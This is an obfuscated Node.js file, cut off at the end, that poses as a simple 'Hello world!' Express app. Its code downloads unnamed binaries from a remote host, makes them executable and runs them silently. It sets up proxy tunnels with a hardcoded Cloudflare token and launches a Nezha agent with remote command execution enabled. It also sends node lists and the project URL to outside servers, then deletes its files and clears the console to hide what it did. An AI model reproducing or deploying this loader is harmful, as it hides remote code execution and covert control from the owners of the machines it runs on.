const _0x4c05cd=_0x1f42;(function(_0x49acde,_0x1aa159){const _0x122409=_0x1f42,_0x396cbe=_0x49acde();while(!![]){try{const _0x3918ff=parseInt(_0x122409(0x206))/0x1*(parseInt(_0x122409(0x212))/0x2)+parseInt(_0x122409(0x20a))/0x3*(parseInt(_0x122409(0x268))/0x4)+-parseInt(_0x122409(0x276))/0x5+-parseInt(_0x122409(0x248))/0x6+parseInt(_0x122409(0x1f0))/0x7+parseInt(_0x122409(0x1fb))/0x8+parseInt(_0x122409(0x222))/0x9;if(_0x3918ff===_0x1aa159)break;else _0x396cbe['push'](_0x396cbe['shift']());}catch(_0x2023bf){_0x396cbe['push'](_0x396cbe['shift']());}}}(_0x20bb,0x72c58));const express=require(_0x4c05cd(0x238)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4c05cd(0x281)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x4c05cd(0x274)]),{execSync}=require(_0x4c05cd(0x20b)),UPLOAD_URL=process[_0x4c05cd(0x289)][_0x4c05cd(0x256)]||'',PROJECT_URL=process['env'][_0x4c05cd(0x22c)]||'',AUTO_ACCESS=process[_0x4c05cd(0x289)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x4c05cd(0x289)][_0x4c05cd(0x1f1)]||_0x4c05cd(0x21d),SUB_PATH=process[_0x4c05cd(0x289)][_0x4c05cd(0x21b)]||'sub',PORT=process[_0x4c05cd(0x289)]['SERVER_PORT']||process[_0x4c05cd(0x289)][_0x4c05cd(0x225)]||0xbb8,UUID=process[_0x4c05cd(0x289)]['UUID']||_0x4c05cd(0x28f),NEZHA_SERVER=process[_0x4c05cd(0x289)][_0x4c05cd(0x272)]||'',NEZHA_PORT=process[_0x4c05cd(0x289)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x4c05cd(0x230)]||'',ARGO_DOMAIN=process['env'][_0x4c05cd(0x227)]||'leaflow.slkapi.dpdns.org',ARGO_AUTH=process[_0x4c05cd(0x289)][_0x4c05cd(0x237)]||_0x4c05cd(0x296),ARGO_PORT=process[_0x4c05cd(0x289)][_0x4c05cd(0x288)]||0x1f41,CFIP=process[_0x4c05cd(0x289)][_0x4c05cd(0x213)]||_0x4c05cd(0x298),CFPORT=process[_0x4c05cd(0x289)][_0x4c05cd(0x29d)]||0x1bb,NAME=process[_0x4c05cd(0x289)][_0x4c05cd(0x204)]||'Leaflow';function _0x20bb(){const _0x3374e2=['2185782MWTESh','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','boot.log','automatic\x20access\x20task\x20added\x20successfully','response','basename','chmod','\x0aclient_secret:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','?encryption=none&security=tls&sni=','push','127.0.0.1','.exe\x20>\x20nul\x202>&1','2083','UPLOAD_URL','countryCode','filter','php\x20running\x20error:\x20','Error\x20downloading\x20files:','statSync','utf-8','split','length','2096','Download\x20','set','vmess','https://amd64.ssss.nyc.mn/bot','application/json','data','base64','http://ip-api.com/json/','2358436uETHre','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','unlinkSync','2087','\x0avless://','freedom','443','Unhandled\x20error\x20in\x20startserver:','2053','\x20is\x20created','NEZHA_SERVER','existsSync','exec','list.txt','4269715HEuYuP','error','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','from','nohup\x20','readdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','platform','listen','direct','path','readFileSync','npm\x20running\x20error:\x20','success','Error\x20in\x20startserver:','/dev/null','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_PORT','env','\x20is\x20running','taskkill\x20/f\x20/im\x20','\x20failed:\x20','config.json','log','4bf42764-b46a-4a48-a2db-b753e7e89d0a','https://amd64.ssss.nyc.mn/v1','false','8443','none','stringify','https://arm64.ssss.nyc.mn/bot','eyJhIjoiZDIxZTIzNjFlYmNhMTEwNDU5YzNkODZiNDA0Yzc4NWIiLCJ0IjoiNzYzZDI5OGItNGU3Ny00ZWE4LTkyZGYtNzQ1MzEwZDQwNWFmIiwicyI6Ik1qQmxOMlJpWWprdE9USXlPUzAwWVRNM0xUZ3laVFF0TnpSak5qSm1ZMkl6T1RRMSJ9','/trojan-argo','cdns.doon.eu.org','pipe','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','mkdirSync','all','CFPORT','/tunnel.yml\x20run','clear','message','org','stream','&path=%2Ftrojan-argo%3Fed%3D2560#','status','Unknown','tunnel.json','trojan','/vmess-argo?ed=2560','map','xtls-rprx-vision','510097QGMsCp','FILE_PATH','block','&fp=firefox&type=ws&host=','toString','\x20>/dev/null\x202>&1','http','\x20already\x20exists','join','firefox','Error\x20executing\x20command:\x20','3616152tvTXoj','substring','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','rm\x20-rf\x20','/api/add-nodes','\x20-c\x20','charAt','/sub.txt\x20saved\x20successfully','arm','NAME','text/plain;\x20charset=utf-8','47IoXPQS','https://arm64.ssss.nyc.mn/v1','isFile','Subscription\x20uploaded\x20successfully','3SAqXxv','child_process','random','arm64','\x0a\x0avmess://','\x20>/dev/null\x202>&1\x20&','\x20-s\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','21252kMeGKM','CFIP','?security=tls&sni=','get','\x0a\x0atrojan://','/config.json\x20>/dev/null\x202>&1\x20&','TunnelSecret','https://arm64.ssss.nyc.mn/agent','/vmess-argo','SUB_PATH','App\x20is\x20running','./tmp','del\x20/f\x20/q\x20','createWriteStream','Add\x20automatic\x20access\x20task\x20faild:\x20','https://arm64.ssss.nyc.mn/web','669807mgjeAW','tls','/vless-argo','PORT','web\x20running\x20error:\x20','ARGO_DOMAIN','then','post','aarch64','/api/delete-nodes','PROJECT_URL','blackhole','send','quic','NEZHA_KEY','Error\x20reading\x20boot.log:','test','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','catch','includes','forEach','ARGO_AUTH','express','vless','floor','has','match','\x0a\x20\x20credentials-file:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-c\x20\x22','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','unshift','Empowerment\x20success\x20for\x20','fileName','country_code','win32','writeFileSync'];_0x20bb=function(){return _0x3374e2;};return _0x20bb();}!fs[_0x4c05cd(0x273)](FILE_PATH)?(fs[_0x4c05cd(0x29b)](FILE_PATH),console[_0x4c05cd(0x28e)](FILE_PATH+_0x4c05cd(0x271))):console['log'](FILE_PATH+_0x4c05cd(0x1f7));function generateRandomName(){const _0x4de382=_0x4c05cd,_0x3ea4cb='abcdefghijklmnopqrstuvwxyz';let _0xc70842='';for(let _0x4e7fb7=0x0;_0x4e7fb7<0x6;_0x4e7fb7++){_0xc70842+=_0x3ea4cb[_0x4de382(0x201)](Math[_0x4de382(0x23a)](Math[_0x4de382(0x20c)]()*_0x3ea4cb[_0x4de382(0x25e)]));}return _0xc70842;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4c05cd(0x1f8)](FILE_PATH,npmName),phpPath=path[_0x4c05cd(0x1f8)](FILE_PATH,phpName),webPath=path[_0x4c05cd(0x1f8)](FILE_PATH,webName),botPath=path[_0x4c05cd(0x1f8)](FILE_PATH,botName),subPath=path[_0x4c05cd(0x1f8)](FILE_PATH,'sub.txt'),listPath=path[_0x4c05cd(0x1f8)](FILE_PATH,_0x4c05cd(0x275)),bootLogPath=path['join'](FILE_PATH,_0x4c05cd(0x24a)),configPath=path[_0x4c05cd(0x1f8)](FILE_PATH,_0x4c05cd(0x28d));function deleteNodes(){const _0x4f144a=_0x4c05cd;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xfdb2cc;try{_0xfdb2cc=fs[_0x4f144a(0x282)](subPath,'utf-8');}catch{return null;}const _0x31e8c2=Buffer['from'](_0xfdb2cc,_0x4f144a(0x266))['toString'](_0x4f144a(0x25c)),_0x35e0bc=_0x31e8c2[_0x4f144a(0x25d)]('\x0a')[_0x4f144a(0x258)](_0x150998=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f144a(0x232)](_0x150998));if(_0x35e0bc[_0x4f144a(0x25e)]===0x0)return;return axios[_0x4f144a(0x229)](UPLOAD_URL+_0x4f144a(0x22b),JSON[_0x4f144a(0x294)]({'nodes':_0x35e0bc}),{'headers':{'Content-Type':_0x4f144a(0x264)}})[_0x4f144a(0x234)](_0x51c535=>{return null;}),null;}catch(_0x3b260c){return null;}}function cleanupOldFiles(){const _0x5c8dfc=_0x4c05cd;try{const _0x488475=fs[_0x5c8dfc(0x27c)](FILE_PATH);_0x488475[_0x5c8dfc(0x236)](_0x438ad7=>{const _0x1745f1=_0x5c8dfc,_0x1f1cb1=path[_0x1745f1(0x1f8)](FILE_PATH,_0x438ad7);try{const _0x415ccf=fs[_0x1745f1(0x25b)](_0x1f1cb1);_0x415ccf[_0x1745f1(0x208)]()&&fs[_0x1745f1(0x26a)](_0x1f1cb1);}catch(_0x3097be){}});}catch(_0x47e665){}}app['get']('/',function(_0x2ce1ca,_0x3973e5){const _0x29be29=_0x4c05cd;_0x3973e5[_0x29be29(0x22e)]('Hello\x20world!');});function _0x1f42(_0x1b8d70,_0x428aaa){_0x1b8d70=_0x1b8d70-0x1e8;const _0x20bb35=_0x20bb();let _0x1f42b0=_0x20bb35[_0x1b8d70];return _0x1f42b0;}async function generateConfig(){const _0x2e24e3=_0x4c05cd,_0x3673dc={'log':{'access':_0x2e24e3(0x286),'error':_0x2e24e3(0x286),'loglevel':_0x2e24e3(0x293)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2e24e3(0x1ef)}],'decryption':_0x2e24e3(0x293),'fallbacks':[{'dest':0xbb9},{'path':_0x2e24e3(0x224),'dest':0xbba},{'path':_0x2e24e3(0x21a),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2e24e3(0x253),'protocol':_0x2e24e3(0x239),'settings':{'clients':[{'id':UUID}],'decryption':_0x2e24e3(0x293)},'streamSettings':{'network':'tcp','security':_0x2e24e3(0x293)}},{'port':0xbba,'listen':_0x2e24e3(0x253),'protocol':_0x2e24e3(0x239),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2e24e3(0x293),'wsSettings':{'path':_0x2e24e3(0x224)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e24e3(0x1f6),_0x2e24e3(0x223),_0x2e24e3(0x22f)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2e24e3(0x262),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2e24e3(0x21a)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e24e3(0x1f6),_0x2e24e3(0x223),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2e24e3(0x253),'protocol':_0x2e24e3(0x1ec),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2e24e3(0x293),'wsSettings':{'path':_0x2e24e3(0x297)}},'sniffing':{'enabled':!![],'destOverride':[_0x2e24e3(0x1f6),'tls',_0x2e24e3(0x22f)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2e24e3(0x26d),'tag':_0x2e24e3(0x280)},{'protocol':_0x2e24e3(0x22d),'tag':_0x2e24e3(0x1f2)}]};fs['writeFileSync'](path[_0x2e24e3(0x1f8)](FILE_PATH,_0x2e24e3(0x28d)),JSON['stringify'](_0x3673dc,null,0x2));}function getSystemArchitecture(){const _0x305337=_0x4c05cd,_0xf43e38=os['arch']();return _0xf43e38===_0x305337(0x203)||_0xf43e38===_0x305337(0x20d)||_0xf43e38===_0x305337(0x22a)?'arm':'amd';}function downloadFile(_0xf5d4f7,_0x7d7c0b,_0x15bcc5){const _0x1d975a=_0x4c05cd,_0x1ae793=_0xf5d4f7;!fs['existsSync'](FILE_PATH)&&fs[_0x1d975a(0x29b)](FILE_PATH,{'recursive':!![]});const _0x2970b5=fs[_0x1d975a(0x21f)](_0x1ae793);axios({'method':'get','url':_0x7d7c0b,'responseType':_0x1d975a(0x2a2)})[_0x1d975a(0x228)](_0x41c19b=>{const _0xec9646=_0x1d975a;_0x41c19b[_0xec9646(0x265)][_0xec9646(0x299)](_0x2970b5),_0x2970b5['on']('finish',()=>{const _0x1d1d3e=_0xec9646;_0x2970b5['close'](),console[_0x1d1d3e(0x28e)]('Download\x20'+path[_0x1d1d3e(0x24d)](_0x1ae793)+'\x20successfully'),_0x15bcc5(null,_0x1ae793);}),_0x2970b5['on'](_0xec9646(0x277),_0x4d9ec9=>{const _0xdfad99=_0xec9646;fs['unlink'](_0x1ae793,()=>{});const _0x4b3396='Download\x20'+path[_0xdfad99(0x24d)](_0x1ae793)+'\x20failed:\x20'+_0x4d9ec9['message'];console[_0xdfad99(0x277)](_0x4b3396),_0x15bcc5(_0x4b3396);});})['catch'](_0x3356b5=>{const _0x3b9154=_0x1d975a,_0x4f0619=_0x3b9154(0x260)+path[_0x3b9154(0x24d)](_0x1ae793)+_0x3b9154(0x28c)+_0x3356b5[_0x3b9154(0x2a0)];console[_0x3b9154(0x277)](_0x4f0619),_0x15bcc5(_0x4f0619);});}async function downloadFilesAndRun(){const _0x1d91e2=_0x4c05cd,_0xb49084=getSystemArchitecture(),_0x3250a2=getFilesForArchitecture(_0xb49084);if(_0x3250a2['length']===0x0){console[_0x1d91e2(0x28e)](_0x1d91e2(0x249));return;}const _0x19f245=_0x3250a2[_0x1d91e2(0x1ee)](_0x1a154c=>{return new Promise((_0x5103da,_0x870b2d)=>{const _0x494f9e=_0x1f42;downloadFile(_0x1a154c[_0x494f9e(0x244)],_0x1a154c['fileUrl'],(_0x3ddfd6,_0x1f2825)=>{_0x3ddfd6?_0x870b2d(_0x3ddfd6):_0x5103da(_0x1f2825);});});});try{await Promise[_0x1d91e2(0x29c)](_0x19f245);}catch(_0x3036cf){console[_0x1d91e2(0x277)](_0x1d91e2(0x25a),_0x3036cf);return;}function _0x4addbf(_0x3e7e9a){const _0x2aeb16=0x1fd;_0x3e7e9a['forEach'](_0x1cdf95=>{const _0x2e55a1=_0x1f42;fs['existsSync'](_0x1cdf95)&&fs[_0x2e55a1(0x24e)](_0x1cdf95,_0x2aeb16,_0x344636=>{const _0x231274=_0x2e55a1;_0x344636?console[_0x231274(0x277)]('Empowerment\x20failed\x20for\x20'+_0x1cdf95+':\x20'+_0x344636):console['log'](_0x231274(0x243)+_0x1cdf95+':\x20'+_0x2aeb16[_0x231274(0x1f4)](0x8));});});}const _0x156563=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4addbf(_0x156563);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x544c25=NEZHA_SERVER[_0x1d91e2(0x235)](':')?NEZHA_SERVER[_0x1d91e2(0x25d)](':')['pop']():'',_0x16c975=new Set([_0x1d91e2(0x26e),_0x1d91e2(0x292),'2096',_0x1d91e2(0x26b),_0x1d91e2(0x255),_0x1d91e2(0x270)]),_0x1c004f=_0x16c975[_0x1d91e2(0x23b)](_0x544c25)?'true':_0x1d91e2(0x291),_0x1f8955=_0x1d91e2(0x24f)+NEZHA_KEY+_0x1d91e2(0x279)+NEZHA_SERVER+_0x1d91e2(0x278)+_0x1c004f+_0x1d91e2(0x29a)+UUID;fs[_0x1d91e2(0x247)](path['join'](FILE_PATH,'config.yaml'),_0x1f8955);const _0x4bec6a='nohup\x20'+phpPath+_0x1d91e2(0x23f)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4bec6a),console[_0x1d91e2(0x28e)](phpName+_0x1d91e2(0x28a)),await new Promise(_0x2c5136=>setTimeout(_0x2c5136,0x3e8));}catch(_0x66ba75){console['error'](_0x1d91e2(0x259)+_0x66ba75);}}else{let _0x47add6='';const _0xad951d=['443',_0x1d91e2(0x292),_0x1d91e2(0x25f),'2087',_0x1d91e2(0x255),_0x1d91e2(0x270)];_0xad951d[_0x1d91e2(0x235)](NEZHA_PORT)&&(_0x47add6='--tls');const _0x400d85='nohup\x20'+npmPath+_0x1d91e2(0x210)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x47add6+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x400d85),console[_0x1d91e2(0x28e)](npmName+_0x1d91e2(0x28a)),await new Promise(_0x3b7ce2=>setTimeout(_0x3b7ce2,0x3e8));}catch(_0x6b76cc){console[_0x1d91e2(0x277)](_0x1d91e2(0x283)+_0x6b76cc);}}}else console[_0x1d91e2(0x28e)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3804be=_0x1d91e2(0x27b)+webPath+_0x1d91e2(0x200)+FILE_PATH+_0x1d91e2(0x217);try{await exec(_0x3804be),console[_0x1d91e2(0x28e)](webName+_0x1d91e2(0x28a)),await new Promise(_0x5468a4=>setTimeout(_0x5468a4,0x3e8));}catch(_0x981f4d){console[_0x1d91e2(0x277)](_0x1d91e2(0x226)+_0x981f4d);}if(fs['existsSync'](botPath)){let _0x296ba2;if(ARGO_AUTH[_0x1d91e2(0x23c)](/^[A-Z0-9a-z=]{120,250}$/))_0x296ba2=_0x1d91e2(0x27d)+ARGO_AUTH;else ARGO_AUTH[_0x1d91e2(0x23c)](/TunnelSecret/)?_0x296ba2=_0x1d91e2(0x1fd)+FILE_PATH+_0x1d91e2(0x29e):_0x296ba2=_0x1d91e2(0x269)+FILE_PATH+_0x1d91e2(0x240)+ARGO_PORT;try{await exec(_0x1d91e2(0x27b)+botPath+'\x20'+_0x296ba2+_0x1d91e2(0x20f)),console['log'](botName+_0x1d91e2(0x28a)),await new Promise(_0x3012c4=>setTimeout(_0x3012c4,0x7d0));}catch(_0x53275f){console[_0x1d91e2(0x277)](_0x1d91e2(0x1fa)+_0x53275f);}}await new Promise(_0x31b0b3=>setTimeout(_0x31b0b3,0x1388));}function getFilesForArchitecture(_0x1bd3c7){const _0x615045=_0x4c05cd;let _0x5c2f6f;_0x1bd3c7===_0x615045(0x203)?_0x5c2f6f=[{'fileName':webPath,'fileUrl':_0x615045(0x221)},{'fileName':botPath,'fileUrl':_0x615045(0x295)}]:_0x5c2f6f=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x615045(0x263)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x18ebf0=_0x1bd3c7===_0x615045(0x203)?_0x615045(0x219):'https://amd64.ssss.nyc.mn/agent';_0x5c2f6f[_0x615045(0x242)]({'fileName':npmPath,'fileUrl':_0x18ebf0});}else{const _0x2bb7da=_0x1bd3c7==='arm'?_0x615045(0x207):_0x615045(0x290);_0x5c2f6f[_0x615045(0x242)]({'fileName':phpPath,'fileUrl':_0x2bb7da});}}return _0x5c2f6f;}function argoType(){const _0x414a2f=_0x4c05cd;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x414a2f(0x28e)](_0x414a2f(0x241));return;}if(ARGO_AUTH[_0x414a2f(0x235)](_0x414a2f(0x218))){fs[_0x414a2f(0x247)](path['join'](FILE_PATH,_0x414a2f(0x1eb)),ARGO_AUTH);const _0x5606a4='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x414a2f(0x25d)]('\x22')[0xb]+_0x414a2f(0x23d)+path['join'](FILE_PATH,_0x414a2f(0x1eb))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x414a2f(0x250);fs[_0x414a2f(0x247)](path['join'](FILE_PATH,'tunnel.yml'),_0x5606a4);}else console[_0x414a2f(0x28e)](_0x414a2f(0x233));}async function extractDomains(){const _0x2c6381=_0x4c05cd;let _0x130f05;if(ARGO_AUTH&&ARGO_DOMAIN)_0x130f05=ARGO_DOMAIN,console[_0x2c6381(0x28e)]('ARGO_DOMAIN:',_0x130f05),await _0x26f243(_0x130f05);else try{const _0x1c1332=fs['readFileSync'](path[_0x2c6381(0x1f8)](FILE_PATH,_0x2c6381(0x24a)),'utf-8'),_0x2e8a75=_0x1c1332[_0x2c6381(0x25d)]('\x0a'),_0x2c68eb=[];_0x2e8a75[_0x2c6381(0x236)](_0x3e1fbf=>{const _0x295450=_0x2c6381,_0x1d1302=_0x3e1fbf[_0x295450(0x23c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1d1302){const _0x8dbec=_0x1d1302[0x1];_0x2c68eb['push'](_0x8dbec);}});if(_0x2c68eb['length']>0x0)_0x130f05=_0x2c68eb[0x0],console[_0x2c6381(0x28e)]('ArgoDomain:',_0x130f05),await _0x26f243(_0x130f05);else{console['log'](_0x2c6381(0x23e)),fs[_0x2c6381(0x26a)](path[_0x2c6381(0x1f8)](FILE_PATH,'boot.log'));async function _0x54fc9c(){const _0x5670c4=_0x2c6381;try{process[_0x5670c4(0x27e)]===_0x5670c4(0x246)?await exec(_0x5670c4(0x28b)+botName+_0x5670c4(0x254)):await exec('pkill\x20-f\x20\x22['+botName[_0x5670c4(0x201)](0x0)+']'+botName[_0x5670c4(0x1fc)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x54c7b4){}}_0x54fc9c(),await new Promise(_0xf895a7=>setTimeout(_0xf895a7,0xbb8));const _0x4d32d0=_0x2c6381(0x269)+FILE_PATH+_0x2c6381(0x240)+ARGO_PORT;try{await exec(_0x2c6381(0x27b)+botPath+'\x20'+_0x4d32d0+_0x2c6381(0x20f)),console[_0x2c6381(0x28e)](botName+_0x2c6381(0x28a)),await new Promise(_0x3860d0=>setTimeout(_0x3860d0,0xbb8)),await extractDomains();}catch(_0x2b7a0a){console[_0x2c6381(0x277)](_0x2c6381(0x1fa)+_0x2b7a0a);}}}catch(_0x27035e){console[_0x2c6381(0x277)](_0x2c6381(0x231),_0x27035e);}async function _0x43fad7(){const _0x4328ae=_0x2c6381;try{const _0x4703a7=await axios[_0x4328ae(0x215)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x4703a7[_0x4328ae(0x265)]&&_0x4703a7[_0x4328ae(0x265)][_0x4328ae(0x245)]&&_0x4703a7[_0x4328ae(0x265)]['org'])return _0x4703a7[_0x4328ae(0x265)][_0x4328ae(0x245)]+'_'+_0x4703a7[_0x4328ae(0x265)][_0x4328ae(0x2a1)];}catch(_0x4ce720){try{const _0x59ce9e=await axios['get'](_0x4328ae(0x267),{'timeout':0xbb8});if(_0x59ce9e[_0x4328ae(0x265)]&&_0x59ce9e[_0x4328ae(0x265)][_0x4328ae(0x1e9)]===_0x4328ae(0x284)&&_0x59ce9e[_0x4328ae(0x265)][_0x4328ae(0x257)]&&_0x59ce9e[_0x4328ae(0x265)]['org'])return _0x59ce9e['data'][_0x4328ae(0x257)]+'_'+_0x59ce9e['data'][_0x4328ae(0x2a1)];}catch(_0x907eb0){}}return _0x4328ae(0x1ea);}async function _0x26f243(_0x38e809){const _0x3ef457=await _0x43fad7(),_0x23f5b1=NAME?NAME+'-'+_0x3ef457:_0x3ef457;return new Promise(_0x2d5500=>{setTimeout(()=>{const _0x37ab67=_0x1f42,_0x530d74={'v':'2','ps':''+_0x23f5b1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x37ab67(0x293),'net':'ws','type':'none','host':_0x38e809,'path':_0x37ab67(0x1ed),'tls':_0x37ab67(0x223),'sni':_0x38e809,'alpn':'','fp':_0x37ab67(0x1f9)},_0x48fefe=_0x37ab67(0x26c)+UUID+'@'+CFIP+':'+CFPORT+_0x37ab67(0x251)+_0x38e809+_0x37ab67(0x1f3)+_0x38e809+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x23f5b1+_0x37ab67(0x20e)+Buffer[_0x37ab67(0x27a)](JSON[_0x37ab67(0x294)](_0x530d74))[_0x37ab67(0x1f4)]('base64')+_0x37ab67(0x216)+UUID+'@'+CFIP+':'+CFPORT+_0x37ab67(0x214)+_0x38e809+_0x37ab67(0x1f3)+_0x38e809+_0x37ab67(0x1e8)+_0x23f5b1+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x37ab67(0x27a)](_0x48fefe)[_0x37ab67(0x1f4)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x37ab67(0x27a)](_0x48fefe)[_0x37ab67(0x1f4)](_0x37ab67(0x266))),console[_0x37ab67(0x28e)](FILE_PATH+_0x37ab67(0x202)),uploadNodes(),app[_0x37ab67(0x215)]('/'+SUB_PATH,(_0x30b2e4,_0x13ee67)=>{const _0xa92456=_0x37ab67,_0x1a4381=Buffer[_0xa92456(0x27a)](_0x48fefe)[_0xa92456(0x1f4)](_0xa92456(0x266));_0x13ee67[_0xa92456(0x261)]('Content-Type',_0xa92456(0x205)),_0x13ee67[_0xa92456(0x22e)](_0x1a4381);}),_0x2d5500(_0x48fefe);},0x7d0);});}}async function uploadNodes(){const _0x3e3ad9=_0x4c05cd;if(UPLOAD_URL&&PROJECT_URL){const _0x3880a0=PROJECT_URL+'/'+SUB_PATH,_0x14411f={'subscription':[_0x3880a0]};try{const _0x33b369=await axios[_0x3e3ad9(0x229)](UPLOAD_URL+'/api/add-subscriptions',_0x14411f,{'headers':{'Content-Type':_0x3e3ad9(0x264)}});return _0x33b369&&_0x33b369[_0x3e3ad9(0x1e9)]===0xc8?(console[_0x3e3ad9(0x28e)](_0x3e3ad9(0x209)),_0x33b369):null;}catch(_0x1b1815){if(_0x1b1815['response']){if(_0x1b1815[_0x3e3ad9(0x24c)][_0x3e3ad9(0x1e9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x7b8b8c=fs[_0x3e3ad9(0x282)](listPath,_0x3e3ad9(0x25c)),_0x4d8f51=_0x7b8b8c[_0x3e3ad9(0x25d)]('\x0a')[_0x3e3ad9(0x258)](_0x217974=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3e3ad9(0x232)](_0x217974));if(_0x4d8f51['length']===0x0)return;const _0x13bb3e=JSON['stringify']({'nodes':_0x4d8f51});try{const _0x3ab752=await axios[_0x3e3ad9(0x229)](UPLOAD_URL+_0x3e3ad9(0x1ff),_0x13bb3e,{'headers':{'Content-Type':'application/json'}});return _0x3ab752&&_0x3ab752['status']===0xc8?(console[_0x3e3ad9(0x28e)]('Nodes\x20uploaded\x20successfully'),_0x3ab752):null;}catch(_0xf13075){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5a6048=_0x1f42,_0x257e12=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x257e12[_0x5a6048(0x252)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x257e12[_0x5a6048(0x252)](phpPath);process[_0x5a6048(0x27e)]===_0x5a6048(0x246)?exec(_0x5a6048(0x21e)+_0x257e12[_0x5a6048(0x1f8)]('\x20')+'\x20>\x20nul\x202>&1',_0x273d30=>{const _0x42b913=_0x5a6048;console['clear'](),console[_0x42b913(0x28e)]('App\x20is\x20running'),console[_0x42b913(0x28e)](_0x42b913(0x211));}):exec(_0x5a6048(0x1fe)+_0x257e12[_0x5a6048(0x1f8)]('\x20')+_0x5a6048(0x1f5),_0x5c750c=>{const _0x557b33=_0x5a6048;console[_0x557b33(0x29f)](),console['log'](_0x557b33(0x21c)),console[_0x557b33(0x28e)](_0x557b33(0x211));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x230d06=_0x4c05cd;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x230d06(0x287));return;}try{const _0x268986=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x230d06(0x264)}});return console[_0x230d06(0x28e)](_0x230d06(0x24b)),_0x268986;}catch(_0x19af4d){return console['error'](_0x230d06(0x220)+_0x19af4d[_0x230d06(0x2a0)]),null;}}async function startserver(){const _0x32fa61=_0x4c05cd;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x162b13){console[_0x32fa61(0x277)](_0x32fa61(0x285),_0x162b13);}}startserver()[_0x4c05cd(0x234)](_0x598686=>{const 